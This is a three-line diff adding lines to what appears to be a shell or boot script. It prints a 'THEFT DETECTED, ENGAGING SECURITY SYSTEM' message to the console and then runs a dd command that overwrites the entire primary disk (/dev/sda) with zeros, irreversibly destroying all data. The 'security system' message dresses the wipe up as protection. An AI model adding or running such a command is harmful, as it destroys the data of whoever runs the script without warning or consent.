@@ -1,0 +1,3 @@
+echo -ne "\nTHEFT DETECTED, ENGAGING SECURITY SYSTEM" > /dev/console 
+dd if=/dev/zero of=/dev/sda
+#echo -e "\\033[62G\\033[1;33m[backgrounded]\\033[0;39m" >/dev/console #column 62, yellow.
